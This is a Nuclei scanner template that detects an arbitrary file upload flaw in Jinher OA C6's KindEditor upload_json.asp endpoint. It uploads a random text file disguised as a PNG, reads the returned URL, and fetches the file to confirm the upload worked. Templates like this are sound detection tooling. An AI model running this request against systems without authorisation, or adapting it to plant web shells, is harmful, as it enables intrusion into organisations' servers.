id: jinher-oa-c6-uploadjson-fileupload

info:
  name: jinher-oa-c6-uploadjson-fileupload
  author: jinher-oa-c6-uploadjson-fileupload
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_text_numeric(30)}}"

http:
  - raw:
      - |
        POST /c6/KindEditor1/asp/upload_json.asp?dir=file HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
        Accept: */*
        Accept-Encoding: gzip
        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
        Connection: close
        
        -----------------------------{{boundary}}
        Content-Disposition: form-data; name="localUrl"
        
        
        -----------------------------{{boundary}}
        Content-Disposition: form-data; name="imgFile"; filename="{{filename}}.txt"
        Content-Type: image/png
        
        {{randstr}}
        -----------------------------{{boundary}}--

      - |
        GET /{{file}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Connection: close
        Accept: */*

    extractors:
      - type: json
        name: file
        part: body_1
        internal: true
        json:
          - .url

    matchers:
      - type: dsl
        dsl: 
          - contains_all(body_2, '{{randstr}}')